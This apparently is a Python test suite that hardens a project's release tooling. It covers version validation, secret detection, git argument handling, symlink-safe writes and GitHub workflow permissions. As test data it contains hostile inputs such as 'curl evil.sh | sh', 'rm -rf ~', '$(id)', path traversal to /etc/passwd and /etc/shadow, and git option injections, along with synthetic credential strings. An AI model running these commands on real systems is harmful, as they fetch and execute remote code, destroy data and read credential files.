"""Security tests for the release tooling.

Release notes are published to a public GitHub page, and the version number flows into git tags,
file names and shell commands in .github/workflows/release.yml. These tests pin down that:
  * only a strict X.Y.Z version is ever accepted (no shell, path, option or unicode tricks),
  * secrets and local paths are caught before they reach the notes,
  * a notes body can't forge or overwrite another release's section,
  * user input never reaches git as an option, and files are written without following symlinks,
  * the workflows don't interpolate untrusted event data into shell and keep minimal permissions.
All secret values below are synthetic.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))       # repo root: import scripts.changelog
from scripts import changelog as cl  # noqa: E402
from test_changelog import BODY, GOOD, make_repo, run  # noqa: E402

REPO = Path(__file__).resolve().parents[2]

HOSTILE_VERSIONS = [
    "0.4.1; rm -rf ~", "0.4.1 && curl evil.sh | sh", "$(id)", "`id`", "0.4.1$(id)", "../../etc/passwd",
    "0.4.1/../../x", "0.4.1\n", "0.4.1\nrm -rf /", "0.4.1\r", "0.4.1\x00", " 0.4.1", "0.4.1 ",
    "-0.4.1", "--help", "0.4.1 --notes-file /etc/shadow", "v0.4.1", "0.4.1-rc.1", "0.4.1+build",
    "٠.٤.١", "０.４.１", "0.4.١", "1e3.0.0", "0x1.0.0", "00.4.1", "0.04.1", "99999.0.0", "", "\\g<0>",
]


class VersionInjectionTests(unittest.TestCase):
    def test_parse_rejects_hostile(self):
        for v in HOSTILE_VERSIONS:
            with self.subTest(v=v), self.assertRaises(cl.ReleaseError):
                cl.parse_version(v)

    def test_non_string_rejected(self):
        for v in (None, 1, b"0.4.1", ["0", "4", "1"]):
            with self.subTest(v=v), self.assertRaises(cl.ReleaseError):
                cl.parse_version(v)  # type: ignore[arg-type]

    def test_bump_rejects_hostile_explicit(self):
        for v in HOSTILE_VERSIONS:
            with self.subTest(v=v), self.assertRaises(cl.ReleaseError):
                cl.bump("0.4.1", v)

    def test_write_version_rejects_hostile_and_writes_nothing(self):
        with tempfile.TemporaryDirectory() as d:
            root = make_repo(Path(d))
            before = {p: (root / p).read_text() for p in (cl.INIT, cl.MANIFEST)}
            for v in HOSTILE_VERSIONS:
                with self.subTest(v=v), self.assertRaises(cl.ReleaseError):
                    cl.write_version(v, root)
            self.assertEqual({p: (root / p).read_text() for p in before}, before)

    def test_hostile_version_in_files_is_refused(self):
        """A poisoned __init__.py must not produce a version the workflow would use in a shell command."""
        for v in ("0.4.1; id", "$(id)", "0.4.1/../x"):
            with self.subTest(v=v), tempfile.TemporaryDirectory() as d:
                root = make_repo(Path(d), version=v)
                with self.assertRaises(cl.ReleaseError):
                    cl.current_version(root)
                self.assertEqual(run(root, "version")[0], 1)

    def test_add_and_notes_reject_hostile(self):
        for v in ("0.5.0; id", "0.5.0\n## [9.9.9] - 2026-01-01", "../0.5.0"):
            with self.subTest(v=v):
                with self.assertRaises(cl.ReleaseError):
                    cl.add_section(GOOD, v, BODY, "2026-11-01")
                with self.assertRaises(cl.ReleaseError):
                    cl.notes(GOOD, v)

    def test_hostile_date_rejected(self):
        for on in ("2026-11-01; id", "2026-11-01\n## [9.9.9]", "$(date)"):
            with self.subTest(on=on), self.assertRaises((cl.ReleaseError, ValueError)):
                cl.add_section(GOOD, "0.5.0", BODY, on)


class SecretDetectionTests(unittest.TestCase):
    # Synthetic values in the right shape; none are real credentials.
    POSITIVE = {
        "GitHub token": ["ghp_" + "a1B2" * 9, "gho_" + "Z" * 36, "github_pat_" + "11ABC_" * 8],
        "Anthropic API key": ["sk-ant-api03-" + "x" * 40],
        "OpenAI-style API key": ["sk-" + "A1" * 20, "sk-proj-" + "b" * 40],
        "AWS access key": ["AKIA" + "ABCDEFGHIJKLMNOP", "ASIA" + "1234567890ABCDEF"],
        "Slack token": ["xoxb-1234567890-abcdefghij"],
        "private key": ["-----BEGIN OPENSSH PRIVATE KEY-----", "-----BEGIN RSA PRIVATE KEY-----"],
        "password assignment": ["password = hunter22", "API_KEY: abcdef123", "secret=s3cr3tvalue"],
        "absolute home path": ["/home/alice/Projects/acme", "/Users/alice/work", "see (/home/bob)"],
    }
    NEGATIVE = [
        "- Config now lives in `~/.config/uurtjie/config.toml`.",
        "- Password reset flow documented.",
        "- Faster startup (sk- prefixed ids are no longer logged).",
        "- Removed `/homepage` route.",
        "- Tokens in quick-add lines can be in any order.",
        "- Works with ASIA/Pacific timezones.",
        "- `XDG_RUNTIME_DIR` defaults to /run/user/1000.",
    ]

    def test_detects(self):
        for name, samples in self.POSITIVE.items():
            for s in samples:
                with self.subTest(name=name, s=s):
                    self.assertIn(name, cl.find_secrets(f"- note {s} here"))

    def test_no_false_positives_on_normal_notes(self):
        for s in self.NEGATIVE:
            with self.subTest(s=s):
                self.assertEqual(cl.find_secrets(s), [])

    def test_body_with_secret_is_refused(self):
        body = "### Fixed\n- Rotated token ghp_" + "Q" * 36 + "\n"
        errs = cl.validate_body(body)
        self.assertTrue(any("GitHub token" in e for e in errs))
        with self.assertRaisesRegex(cl.ReleaseError, "GitHub token"):
            cl.add_section(GOOD, "0.5.0", body, "2026-11-01")

    def test_check_flags_secret_already_in_changelog(self):
        text = GOOD.replace("- Renamed from tally.", "- Renamed from tally, see /home/alice/notes.")
        self.assertTrue(any("absolute home path" in e for e in cl.check(text)))

    def test_cli_add_refuses_secret_and_leaves_file(self):
        with tempfile.TemporaryDirectory() as d:
            root = make_repo(Path(d))
            before = (root / cl.CHANGELOG).read_text()
            notes = root / "n.md"
            notes.write_text("### Added\n- Key AKIAABCDEFGHIJKLMNOP\n")
            code, _, err = run(root, "add", "0.5.0", "--notes-file", str(notes))
            self.assertEqual(code, 1)
            self.assertIn("AWS access key", err)
            self.assertNotIn("AKIAABCDEFGHIJKLMNOP", err)        # the error names the kind, never echoes the secret
            self.assertEqual((root / cl.CHANGELOG).read_text(), before)


class SectionForgeryTests(unittest.TestCase):
    def test_body_cannot_inject_another_release(self):
        forged = "### Added\n- ok\n\n## [0.3.0] - 2026-10-21\n\n### Added\n- forged notes for an old release\n"
        with self.assertRaisesRegex(cl.ReleaseError, "level-2 heading"):
            cl.add_section(GOOD, "0.5.0", forged, "2026-11-01")

    def test_body_cannot_inject_top_heading(self):
        with self.assertRaises(cl.ReleaseError):
            cl.add_section(GOOD, "0.5.0", "# Changelog\n- x\n", "2026-11-01")

    def test_notes_never_spill_into_next_section(self):
        out = cl.add_section(GOOD, "0.5.0", BODY, "2026-11-01")
        self.assertNotIn("0.4.1", cl.notes(out, "0.5.0"))
        self.assertNotIn("Export as CSV", cl.notes(out, "0.5.0"))

    def test_heading_lookalikes_do_not_match(self):
        text = "## [0.4.1] - 2026-10-25\n- real\n"
        for v in ("0.4", "4.1", "0.4.1]"):
            with self.subTest(v=v), self.assertRaises(cl.ReleaseError):
                cl.notes(text, v)


class GitArgumentTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = make_repo(Path(self.tmp.name))
        env = {**os.environ, "GIT_AUTHOR_NAME": "T", "GIT_AUTHOR_EMAIL": "t@example.com",
               "GIT_COMMITTER_NAME": "T", "GIT_COMMITTER_EMAIL": "t@example.com", "GIT_CONFIG_GLOBAL": os.devnull}
        self.git = lambda *a: subprocess.run(["git", *a], cwd=self.root, env=env, check=True, capture_output=True)
        self.git("init", "-q", "-b", "main")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "Initial import")

    def tearDown(self):
        self.tmp.cleanup()

    def test_since_option_injection_rejected(self):
        marker = Path(self.tmp.name) / "pwned"
        for since in (f"--output={marker}", "-p", "HEAD~1", "main", "v0.4.1..HEAD", "v0.4.1;touch pwned",
                      "$(touch pwned)", "@{-1}", "v0.4.1 --all", "v0.4.1\n"):
            with self.subTest(since=since), self.assertRaisesRegex(cl.ReleaseError, "invalid --since"):
                cl.commits(since, self.root)
        self.assertFalse(marker.exists())
        self.assertFalse((self.root / "pwned").exists())

    def test_commit_with_secret_is_flagged(self):
        self.git("tag", "v0.4.1")
        self.git("commit", "-q", "--allow-empty", "-m", "Fix login\n\ntoken was ghp_" + "k" * 36)
        cs = cl.commits(root=self.root)
        self.assertEqual(cs[0]["secrets"], ["GitHub token"])

    def test_hostile_commit_subject_is_data(self):
        """Subjects with shell syntax or fake headings come back verbatim as JSON strings."""
        self.git("tag", "v0.4.1")
        subject = "Add $(rm -rf ~) `id` \"quotes\" and ## [9.9.9] heading"
        self.git("commit", "-q", "--allow-empty", "-m", subject)
        code, out, _ = run(self.root, "commits")
        self.assertEqual(code, 0)
        self.assertEqual(json.loads(out)["commits"][0]["subject"], subject)

    def test_separator_characters_in_message_cannot_shift_fields(self):
        """A body containing the record/field separators must not spoof the sha/subject of a commit."""
        self.git("tag", "v0.4.1")
        self.git("commit", "-q", "--allow-empty", "-m", "Real subject\n\nbody\x1ffake-sha\x1fFake subject\x1fmore")
        cs = cl.commits(root=self.root)
        self.assertEqual(len(cs), 1)
        self.assertEqual(cs[0]["subject"], "Real subject")
        self.assertRegex(cs[0]["sha"], r"^[0-9a-f]{12}$")
        self.assertEqual(cs[0]["body"], "body\x1ffake-sha\x1fFake subject\x1fmore")

    def test_git_runs_without_shell(self):
        self.assertNotIn("shell=True", Path(cl.__file__).read_text())


class FileWriteTests(unittest.TestCase):
    def test_atomic_write_does_not_follow_symlink(self):
        with tempfile.TemporaryDirectory() as d, tempfile.TemporaryDirectory() as outside:
            target = Path(outside) / "victim.txt"
            target.write_text("original")
            link = Path(d) / "CHANGELOG.md"
            link.symlink_to(target)
            cl.atomic_write(link, "new")
            self.assertEqual(target.read_text(), "original")       # the file outside is untouched
            self.assertFalse(link.is_symlink())
            self.assertEqual(link.read_text(), "new")

    def test_temp_file_is_private_while_written(self):
        seen = {}
        real = os.fdopen

        def spy(fd, *a, **k):
            seen["mode"] = os.fstat(fd).st_mode & 0o777
            return real(fd, *a, **k)
        with tempfile.TemporaryDirectory() as d:
            os.fdopen = spy
            try:
                cl.atomic_write(Path(d) / "x.md", "data")
            finally:
                os.fdopen = real
        self.assertEqual(seen["mode"], 0o600)


class ReDoSTests(unittest.TestCase):
    def test_pathological_input_is_fast(self):
        nasty = [
            "## [" + "1." * 50000 + "\n",
            "## [1.0.0] - " + "x" * 200000 + " " * 200000 + "!\n",
            "- " + "password" * 20000 + "\n",
            "- " + "/home/" * 40000 + "\n",
            "- sk-ant-" + "-" * 200000 + "\n",
            "1." * 100000,
        ]
        for text in nasty:
            with self.subTest(text=text[:20]):
                t0 = time.perf_counter()
                cl.check(text)
                cl.find_secrets(text)
                with self.assertRaises(cl.ReleaseError):
                    cl.parse_version(text)
                self.assertLess(time.perf_counter() - t0, 1.0)


class WorkflowHardeningTests(unittest.TestCase):
    """Static checks on .github/workflows: the release job writes to the repo, so keep it tight."""
    WF = REPO / ".github/workflows"
    UNTRUSTED = re.compile(r"\$\{\{\s*github\.(event\.|head_ref)")

    def workflows(self):
        files = sorted(self.WF.glob("*.yml"))
        self.assertTrue(files)
        return {p.name: p.read_text() for p in files}

    def test_no_untrusted_context_in_workflows(self):
        for name, text in self.workflows().items():
            with self.subTest(workflow=name):
                self.assertIsNone(self.UNTRUSTED.search(text),
                                  "pass event data through env:, never ${{ github.event.* }} inside run:")

    def test_no_pull_request_target(self):
        for name, text in self.workflows().items():
            with self.subTest(workflow=name):
                self.assertNotIn("pull_request_target", text)

    def test_release_permissions_minimal(self):
        text = self.workflows()["release.yml"]
        self.assertRegex(text, r"(?m)^permissions:\s*\n\s+contents: write\s*$")
        self.assertNotRegex(text, r"write-all|id-token|packages: write|actions: write")

    def test_ci_has_no_write_permissions(self):
        self.assertNotIn(": write", self.workflows()["ci.yml"])

    def test_release_only_from_release_branch(self):
        text = self.workflows()["release.yml"]
        self.assertRegex(text, r"(?ms)^on:\s*\n\s+push:\s*\n\s+branches: \[release\]")

    def test_version_goes_through_env_not_inline(self):
        text = self.workflows()["release.yml"]
        uses = [l.strip() for l in text.splitlines() if "steps.build.outputs.version" in l]
        self.assertTrue(uses)
        for line in uses:
            self.assertEqual(line, "VERSION: ${{ steps.build.outputs.version }}")

    def test_actions_pinned_to_versions(self):
        for name, text in self.workflows().items():
            for uses in re.findall(r"uses:\s*(\S+)", text):
                with self.subTest(workflow=name, uses=uses):
                    self.assertRegex(uses, r"@(v\d+(\.\d+)*|[0-9a-f]{40})$")


class TarballContentTests(unittest.TestCase):
    """The public tarball must not ship dev tooling, local data or secrets."""

    def test_export_ignore(self):
        attrs = (REPO / ".gitattributes").read_text()
        for path in (".github/", "scripts/", ".claude/"):
            self.assertRegex(attrs, rf"(?m)^{re.escape(path)}\s+export-ignore")

    def test_gitignore_keeps_data_out(self):
        ignore = (REPO / ".gitignore").read_text().split()
        for pat in ("*.db", "*.db-wal", "*.db-shm", "dist/", "__pycache__/"):
            self.assertIn(pat, ignore)

    def test_no_tracked_secrets(self):
        files = subprocess.run(["git", "ls-files"], cwd=REPO, capture_output=True, text=True, check=True).stdout.split()
        # These two hold the patterns and synthetic samples themselves.
        skip = {"scripts/tests/test_changelog_security.py", "scripts/changelog.py"}
        for f in files:
            if f in skip or not (REPO / f).is_file():
                continue
            try:
                text = (REPO / f).read_text()
            except UnicodeDecodeError:
                continue
            # Real credentials only; the README legitimately shows example paths and "password" words.
            hits = [n for n in cl.find_secrets(text) if n not in ("password assignment", "absolute home path")]
            with self.subTest(file=f):
                self.assertEqual(hits, [])


if __name__ == "__main__":
    unittest.main()
